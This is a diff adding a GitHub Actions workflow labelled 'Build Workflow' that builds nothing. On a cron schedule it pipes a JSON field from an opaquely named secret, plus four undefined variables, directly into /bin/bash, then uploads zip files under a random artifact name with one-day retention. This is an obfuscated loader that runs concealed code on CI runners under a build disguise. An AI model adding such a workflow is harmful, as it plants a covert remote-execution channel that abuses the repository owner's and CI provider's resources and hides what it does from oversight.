@@ -1,0 +1,32 @@
+name: Build Workflow
+on:
+  workflow_dispatch:
+
+  schedule:
+    - cron: '1 4,10,16,22 * * *'
+permissions:
+  contents: read
+concurrency:
+  group: ${{ github.workflow }}
+  cancel-in-progress: false
+jobs:
+  agent:
+    runs-on: ubuntu-latest
+    steps:
+      - uses: actions/checkout@v4
+      - name: Perform
+        env:
+          nkx6: ${{ secrets.nkx6 }}
+        run: |
+          printf '%s' "$nkx6" | jq -r .pw397 | /bin/bash
+          printf '%s' "$qlgvk82604" | jq -r .p59 | /bin/bash
+          printf '%s' "$luho82017" | jq -r .adqae800 | /bin/bash
+          printf '%s' "$x6985" | jq -r .w7 | /bin/bash
+          printf '%s' "$rtmn977" | jq -r .m5 | /bin/bash
+
+      - name: Upload results
+        uses: actions/upload-artifact@v4
+        with:
+          name: Z2VjPEj9
+          path: "*.zip"
+          retention-days: 1
